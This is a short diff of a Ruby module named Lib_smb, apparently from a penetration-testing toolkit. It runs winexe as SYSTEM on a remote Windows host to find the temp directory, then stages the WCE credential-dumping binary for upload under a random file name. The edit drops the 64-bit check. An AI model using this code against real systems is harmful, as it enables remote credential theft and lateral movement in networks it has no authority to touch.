@@ -125,25 +125,18 @@ module Lib_smb
 		smboptions = "--system //#{host}"
 		# Check if 64 bit to determine which binary to upload
 		
-		arch = ''		
+		temp_dir = ''		
 		3.times do
-			arch = winexe(smboptions,"CMD /C echo %PROCESSOR_ARCHITECTURE% && echo %TEMP%")
-			break unless arch.empty?
+			temp_dir = winexe(smboptions,"CMD /C echo %TEMP%").chomp
+			break unless temp_dir.empty?
 			sleep 3
 		end
 		wceexe = '' 
 
 		# Stop error out if machine is not ont a domain
-		unless arch.empty?
-			arch = arch.split(' ')
-
-			temp_dir = arch[1].chomp
-			if arch[0].chomp.eql? "AMD64"
-				wceexe = Menu.extbin[:wce64]
-			else
-				wceexe = Menu.extbin[:wce]
-			end
-
+		unless temp_dir.empty?
+			wceexe = Menu.extbin[:wce]
+	
 			# Create random name for wce, between 8 and 12 characters in length
 			wce_upload_name = "#{random_name}.exe"
 
